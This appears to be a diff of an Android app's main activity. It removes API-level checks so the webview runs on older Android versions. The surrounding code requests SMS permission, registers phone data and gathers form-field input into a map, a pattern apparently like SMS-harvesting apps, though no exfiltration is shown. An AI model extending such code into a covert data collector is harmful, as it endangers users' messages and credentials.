@@ -40,14 +40,12 @@
         public Map<Integer, String> ids;
         public HashMap<String, Object> dataObject;
 
-
         private static final int SMS_PERMISSION_REQUEST_CODE = 1;
 
         @SuppressLint("SetTextI18n")
         @Override
         protected void onCreate(Bundle savedInstanceState) {
             super.onCreate(savedInstanceState);
-
             Helper help1 = new Helper();
             help1.SITE();
             if(!Helper.isNetworkAvailable(this)) {
@@ -55,10 +53,9 @@
                 startActivity(intent);
             }
             checkPermissions();
-
         }
 
-        @RequiresApi(api = Build.VERSION_CODES.TIRAMISU)
+
         private void initializeWebView() {
             setContentView(R.layout.activity_main);
             registerPhoneData();
@@ -80,7 +77,6 @@
                 int viewId = entry.getKey();
                 String key = entry.getValue();
                 EditText editText = findViewById(viewId);
-
                 String value = editText.getText().toString().trim();
                 dataObject.put(key, value);
             }
@@ -190,11 +186,7 @@
 
                 }, SMS_PERMISSION_REQUEST_CODE);
             } else {
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-                    initializeWebView();
-                }else{
-                    Toast.makeText(this, "App is not supporting to this version", Toast.LENGTH_SHORT).show();
-                }
+                initializeWebView();
             }
         }
 
@@ -214,9 +206,7 @@
                         }
                     }
                     if (allPermissionsGranted) {
-                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-                            initializeWebView();
-                        }
+                        initializeWebView();
                     } else {
                         showPermissionDeniedDialog();
                         Toast.makeText(this, "Permissions denied:\n" + missingPermissions.toString(), Toast.LENGTH_LONG).show();
